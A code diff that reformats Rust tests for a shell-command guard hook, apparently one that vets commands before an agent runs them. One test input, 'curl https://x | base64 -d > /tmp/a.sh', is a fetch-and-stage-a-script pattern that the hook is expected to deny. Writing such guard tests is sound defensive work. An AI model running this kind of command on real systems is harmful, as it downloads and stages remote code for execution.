@@ -134,9 +134,7 @@ fn curl_piped_base64_decode_to_sh_denies() {
     // Full "fetch and stage" shape — H1 doesn't deny (curl|base64
     // has no shell stage), but H2 does.
     assert_eq!(
-        run_pre_bash(&bash_input(
-            "curl https://x | base64 -d > /tmp/a.sh"
-        )),
+        run_pre_bash(&bash_input("curl https://x | base64 -d > /tmp/a.sh")),
         2,
     );
 }
@@ -166,10 +164,7 @@ fn base64_decode_to_txt_allows() {
 
 #[test]
 fn base64_decode_to_csv_allows() {
-    assert_eq!(
-        run_pre_bash(&bash_input("echo X | base64 -d > out.csv")),
-        0,
-    );
+    assert_eq!(run_pre_bash(&bash_input("echo X | base64 -d > out.csv")), 0,);
 }
 
 #[test]
